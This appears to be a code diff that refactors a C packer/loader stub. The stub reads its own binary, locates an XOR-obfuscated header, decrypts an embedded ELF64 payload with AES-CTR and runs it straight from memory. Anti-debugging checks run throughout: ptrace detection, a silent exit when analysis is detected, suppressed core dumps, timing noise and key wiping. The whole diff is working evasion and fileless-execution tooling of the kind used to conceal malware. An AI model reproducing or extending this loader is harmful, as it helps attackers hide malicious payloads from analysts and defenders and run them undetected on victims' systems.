@@ -177,6 +177,9 @@ int check_debug_environment(void) {
 }
 
 int comprehensive_anti_debug_check() {
+#ifdef DISABLE_ANTI_ANALYSIS
+    return 0;
+#else
 
     if (detect_ptrace()) {
         DBG("ptrace detected\n");
@@ -200,31 +203,37 @@ int comprehensive_anti_debug_check() {
     }
 
     return 0;
+#endif
 }
 
 
-int multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
-    if (!data || !header || len > INT_MAX) return 0;
+static uint8_t* find_packed_header(uint8_t* data, size_t data_size,
+                                   pack_header_t* header) {
+    size_t offset;
+    uint32_t needle;
 
-    rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
+    if (!data || !header || data_size < sizeof(pack_header_t)) return NULL;
 
-    if (!chacha20_decrypt(data, len, header->secondary_key, header->nonce))
-        return 0;
-    if (!aes256_decrypt(data, len, header->primary_key)) return 0;
-    return 1;
-}
+    needle = g_packed_magic;
+    offset = data_size - sizeof(pack_header_t);
+    for (;;) {
+        uint32_t candidate_magic;
+        memcpy(&candidate_magic, data + offset, sizeof(candidate_magic));
+        if (candidate_magic == needle) {
+            size_t i;
+            size_t payload_size = data_size - offset - sizeof(*header);
 
-pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
-    if (data_size < sizeof(pack_header_t)) {
-        return NULL;
-    }
+            memcpy(header, data + offset, sizeof(*header));
+            for (i = sizeof(uint32_t); i < sizeof(*header); ++i)
+                ((uint8_t*)header)[i] ^=
+                    g_pack_polymorph[i - sizeof(uint32_t)];
 
-    uint32_t needle = g_packed_magic;
-    for (size_t i = data_size - sizeof(pack_header_t); i > 0; i--) {
-        pack_header_t* header = (pack_header_t*)(data + i);
-        if (header->magic == needle) {
-            return header;
+            if (pack_header_valid(header, payload_size))
+                return data + offset;
+            secure_memory_wipe(header, sizeof(*header));
         }
+        if (offset == 0) break;
+        --offset;
     }
     return NULL;
 }
@@ -232,11 +241,10 @@ pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
 int main(int argc, char* argv[], char* envp[]) {
     FILE* self_fp;
     uint8_t* self_data;
+    uint8_t* header_data;
     size_t self_size;
-    pack_header_t* header;
-    uint8_t* encrypted_data;
-    uint8_t* decrypted_data;
-    uint32_t calculated_crc;
+    pack_header_t header;
+    int result = 1;
 
     prevent_core_dumps();
 
@@ -254,15 +262,18 @@ int main(int argc, char* argv[], char* envp[]) {
 
     noise_delay(150);
 
-    fseek(self_fp, 0, SEEK_END);
-    self_size = ftell(self_fp);
-    fseek(self_fp, 0, SEEK_SET);
-
-    if (self_size == 0 || self_size > SIZE_MAX / 2) {
+    if (fseek(self_fp, 0, SEEK_END) != 0) {
+        DBG("cannot determine self size\n");
+        fclose(self_fp);
+        return 1;
+    }
+    long self_length = ftell(self_fp);
+    if (self_length <= 0 || fseek(self_fp, 0, SEEK_SET) != 0) {
         DBG("invalid self size\n");
         fclose(self_fp);
         return 1;
     }
+    self_size = (size_t)self_length;
 
     self_data = malloc(self_size);
     if (!self_data) {
@@ -281,102 +292,56 @@ int main(int argc, char* argv[], char* envp[]) {
     }
     fclose(self_fp);
 
-    header = find_packed_header(self_data, self_size);
-    if (!header) {
+    header_data = find_packed_header(self_data, self_size, &header);
+    if (!header_data) {
         DBG("packed header not found\n");
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
     }
 
-    {
-        uint8_t* hb = (uint8_t*)header;
-        size_t   hdr_body = sizeof(pack_header_t) - sizeof(uint32_t);
-        for (size_t i = 0; i < hdr_body; i++)
-            hb[sizeof(uint32_t) + i] ^= g_pack_polymorph[i];
-    }
-
     if (comprehensive_anti_debug_check()) {
-        secure_memory_wipe(self_data, self_size);
-        free(self_data);
-        exit(0);
+        result = 0;
+        goto cleanup;
     }
 
-    size_t header_offset = (size_t)((uint8_t*)header - self_data);
-    if (header_offset > self_size ||
-        sizeof(pack_header_t) > self_size - header_offset) {
-        DBG("packed header is out of bounds\n");
-        secure_memory_wipe(self_data, self_size);
-        free(self_data);
-        return 1;
-    }
-
+    size_t header_offset = (size_t)(header_data - self_data);
     size_t payload_offset = header_offset + sizeof(pack_header_t);
-    size_t payload_bytes = self_size - payload_offset;
-    if (header->original_size == 0 ||
-        header->original_size != header->packed_size ||
-        (size_t)header->packed_size > payload_bytes) {
-        DBG("packed payload sizes are invalid\n");
-        secure_memory_wipe(self_data, self_size);
-        free(self_data);
-        return 1;
-    }
-    encrypted_data = self_data + payload_offset;
-    decrypted_data = malloc(header->original_size);
-    if (!decrypted_data) {
-        DBG("cannot allocate payload buffer\n");
-        secure_memory_wipe(self_data, self_size);
-        free(self_data);
-        return 1;
-    }
+    size_t executable_size = header.original_size;
 
-    memcpy(decrypted_data, encrypted_data, header->original_size);
+    /* Reuse the self buffer and erase the embedded copy of the keys. */
+    secure_memory_wipe(header_data, sizeof(header));
+    memmove(self_data, self_data + payload_offset, executable_size);
 
-    if (!multi_layer_decrypt(decrypted_data, header->original_size, header)) {
+    if (!aes256_ctr_crypt(self_data, executable_size,
+                          header.key, header.iv)) {
         DBG("payload decryption failed\n");
-        secure_memory_wipe(decrypted_data, header->original_size);
-        secure_memory_wipe(self_data, self_size);
-        free(decrypted_data);
-        free(self_data);
-        return 1;
+        goto cleanup;
     }
-    calculated_crc = crc32(decrypted_data, header->original_size);
-    if (calculated_crc != header->crc32) {
+    if (crc32(self_data, executable_size) != header.crc32) {
         DBG("decrypted payload CRC mismatch\n");
-        secure_memory_wipe(decrypted_data, header->original_size);
-        secure_memory_wipe(self_data, self_size);
-        free(decrypted_data);
-        free(self_data);
-        return 1;
+        goto cleanup;
     }
-    if (!is_elf64(decrypted_data)) {
+    if (executable_size < sizeof(Elf64_Ehdr) || !is_elf64(self_data)) {
         DBG("decrypted payload is not ELF64\n");
-        secure_memory_wipe(decrypted_data, header->original_size);
-        secure_memory_wipe(self_data, self_size);
-        free(decrypted_data);
-        free(self_data);
-        return 1;
+        goto cleanup;
     } 
     if (comprehensive_anti_debug_check()) {
-        secure_memory_wipe(decrypted_data, header->original_size);
-        secure_memory_wipe(self_data, self_size);
-        free(decrypted_data);
-        free(self_data);
-        exit(0);
+        result = 0;
+        goto cleanup;
     }
-    if (execute_from_memory(decrypted_data, header->original_size, argv, envp) < 0) {
+
+    secure_memory_wipe(&header, sizeof(header));
+
+    if (execute_from_memory(self_data, executable_size, argv, envp) < 0) {
         DBG("in-memory execution failed\n");
-        secure_memory_wipe(decrypted_data, header->original_size);
-        secure_memory_wipe(self_data, self_size);
-        free(decrypted_data);
-        free(self_data);
-        return 1;
+        goto cleanup;
     }
+    result = 0;
 
-    secure_memory_wipe(decrypted_data, header->original_size);
+cleanup:
+    secure_memory_wipe(&header, sizeof(header));
     secure_memory_wipe(self_data, self_size);
-    free(decrypted_data);
     free(self_data);
-
-    return 0;
+    return result;
 }
